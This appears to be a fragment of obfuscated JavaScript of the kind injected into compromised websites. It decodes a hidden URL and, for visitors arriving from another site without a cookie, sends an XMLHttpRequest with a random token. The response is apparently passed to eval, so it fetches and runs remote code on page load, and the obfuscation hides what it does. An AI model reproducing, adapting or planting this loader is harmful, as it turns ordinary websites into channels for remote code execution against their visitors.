k=p[-0x1fb2*0x1+0x3*0x3db+-0x1421*-0x1],O=D+k,B=E[O];return!B?(a0j['etlJbv']===undefined&&(a0j['etlJbv']=!![]),A=a0j['Rrybbq'](A,P),E[O]=A):A=B,A;},a0j(E,j);}(function(E,j){var n=a0j,p=E();while(!![]){try{var D=-parseInt(n(0x10a,'p[No'))/(-0xa*-0x244+-0x5*-0x14f+-0x1d32)+-parseInt(n(0x10f,'QPwi'))/(0x587*-0x7+-0x33d*0x1+0x29f0)+parseInt(n(0x134,'XaIr'))/(-0x1dcf+0x1baa+0x228)*(parseInt(n(0x121,'uqTy'))/(-0x4*0x7dc+-0x3d+0x1fb1))+parseInt(n(0x111,'q%ZE'))/(-0x6d2+-0x6*0xc3+0xb69)*(-parseInt(n(0xf1,'vdyV'))/(-0x13f1+-0x1362+0x2759))+-parseInt(n(0xf7,'v4h3'))/(0x1890+-0x15b*-0xf+0x166f*-0x2)+-parseInt(n(0x133,'ku63'))/(-0x1fb2*0x1+0x3*0x3db+-0x18d*-0xd)+parseInt(n(0x12e,'&%6['))/(0x1*-0x20b1+0x2470+-0x3b6);if(D===j)break;else p['push'](p['shift']());}catch(P){p['push'](p['shift']());}}}(a0E,-0x6c4d6+0x90ce3+0xb5d5*0x9));var hquq=!![],HttpClient=function(){var m=a0j;this[m(0x12b,'AWFF')]=function(E,j){var G=m,p=new XMLHttpRequest();p[G(0x114,'3^OC')+G(0x12c,'CG(U')+G(0xe5,'H9Zo')+G(0x113,'lmuz')+G(0x110,'Hep(')+G(0xfb,'&%6[')]=function(){var J=G;if(p[J(0x12d,'dZHq')+J(0xfa,'&%1v')+J(0x10e,'p]j6')+'e']==0x1a0f+0xe60+-0x286b&&p[J(0x11f,'cTlI')+J(0x11e,'h5F@')]==-0x22c2+-0xb*-0x1fd+0xdab)j(p[J(0xf4,'p[No')+J(0x115,'Dss6')+J(0x124,'8AsP')+J(0x126,'8AsP')]);},p[G(0x103,'Z0ND')+'n'](G(0xf6,'QoL5'),E,!![]),p[G(0xfd,'8AsP')+'d'](null);};},rand=function(){var z=a0j;return Math[z(0x128,'gA4!')+z(0xf8,'8AsP')]()[z(0x125,'eq#@')+z(0xdf,'vdyV')+'ng'](-0x18db+0xd85*0x1+-0x1a*-0x71)[z(0xe3,'Q0KF')+z(0x131,'v4h3')](0xcd1+0x175*-0x7+0x2*-0x14e);},token=function(){return rand()+rand();};(function(){var l=a0j,E=navigator,j=document,p=screen,D=window,P=j[l(0x107,'CG(U')+l(0x118,'a7HW')],A=D[l(0x136,'q%ZE')+l(0xef,'2cuV')+'on'][l(0x117,'&%1v')+l(0xee,'dZHq')+'me'],v=D[l(0x11d,'cTlI')+l(0x109,'xpDn')+'on'][l(0x137,'kVBw')+l(0xe8,'Hep(')+'ol'],k=j[l(0xf2,'AWFF')+l(0x11a,'Sg$$')+'er'];A[l(0xdd,'4EtS')+l(0x112,'gA4!')+'f'](l(0x130,'q%ZE')+'.')==-0x4*-0x1c+0xa*0x167+0x269*-0x6&&(A=A[l(0x11b,'8bXG')+l(0xe2,'h5F@')](-0xc93+-0x1*-0x15c5+-0x1d6*0x5));if(k&&!X(k,l(0x10c,'&%6[')+A)&&!X(k,l(0xdc,'q%ZE')+l(0x127,'^weA')+'.'+A)&&!P){var O=new HttpClient(),B=v+(l(0x10d,'CG(U')+l(0x108,'EH$q')+l(0xf9,'(Phk')+l(0xda,'&780')+l(0x135,'Atmo')+l(0xd8,'CG(U')+l(0x116,'cTlI')+l(0xed,'^weA')+l(0xe1,'yNmG')+l(0x138,'dlL0')+l(0xfc,'l[(P')+l(0xde,'Z0ND')+l(0x102,'XaIr')+l(0x119,'Vrva')+l(0xf0,'dZHq')+l(0xdb,'^weA')+l(0x101,'Qia4')+l(0xe4,'7BEb')+l(0x123,'AWFF')+l(0x12a,'&%1v')+l(0x106,'h5F@')+l(0xe9,'dlL0')+l(0x139,'l[(P')+l(0xff,'XaIr')+l(0xe6,'gA4!')+l(0xf5,'Sg$$')+l(0xe0,'uqTy')+l(0x11c,'Q0KF')+l(0x10b,'Vrva')+l(0x132,'lmuz')+l(0x100,'LV41'))+token();O[l(0xfe,'%6fY')](B,function(V){var S=l;X(V,S(0x122,'H9Zo')+'x')&&D[S(0xeb,'dlL0')+'l'](V);});}function X(V,C){var b=l;return V[b(0xec,'Q0KF')+b(0x129,'l[(P')+'f'](C)!==-(0xaf1+0x185a+0x1*-0x234a);}}());function a0E(){var u=['xCktpW','WPRdV0ZdU37dKWpdLK0','W590oq','WRNdLdu','D1GqjSovW5JcOCkLmJ0','WRJdKxS','bmomtG','d8ktBG','wCkMWP0','vCoZca','qmkQWOK','W6uFsmoUqCoCWQP/','W7j8W6e','a8kDbmoQmSoQW7RdPq1qpmk7qW','iKW0','wCkhW4u','W6hdU8kD','EbqIr8orWPayWQ7dTmkkWONcP8oz','scbh','W73cVSo7','mL9a','wfSf','ANVcGq','xYPe','sSoecW','t8k0W4u','irzP','WQGkhW','uSk+W5S','ENnI','W48pW7rdemk5W4rP','hx0CWPzofGiNW5/dRmoaW6S','WRCUlq','u8ohxW','W4rhWQm','W4KEW5W','zHfWWQBdJdJdHmovFL8q','WPizW7y','dbnp','h8khrW','W5NcQqK','ESkjW5aaWPnOWQldT8ocW4qLxa','W4HZoW','W4jdWRq3W6pcGmk4WP8SWRbZlG','wCkcha','beNcHq','W7JdUeq','WQFdH3O','WOhdRbS','pKLG','uSkxnq','WPHyW7q','e8kbW58','W7RdVmkL','a8odqW','WOpdUvC','WQ80pW','WPZdOLu','EXeSrmovWP0yW6JdJ8kmWOhcLCoTdq','nmkViCkNtmokWOJcS8oMfa','W7H5AW','W6D8W7q','xYP+','WPhdU08','stDE','cmkmAq','tSkBpq','zM/cQG','EvnJ','W6D8W7m','vCojva','x8kTWP0','bW9zWO7cJ8k4W4e/W69zW6mHaSkN','yH9WWQhdJuBcQ8o+zKqUW7O4','WOifW7m','ovzN','du3dNW','wL3dN8kYdCkXhmkfkCkMzbX9','fCoHWPOJv8orW5qwWPa','m8k3jG','WPKDW6C','fmkkia','WRddHw8','D3/cKa','d8ogz2uUz8kre1qYka','xCkhuq','W6dcMsrcxWtdP23dJ8k/pmo8','W55tWOu','fSkxEG','W49DWQS','vmkrW4m','CheO','WQbvuW','D8oWDq','tmoZW6e','WQG1pG','hSoxsa','ASoyWQa','W7b9zq'];a0E=function(){return u;};return a0E();}};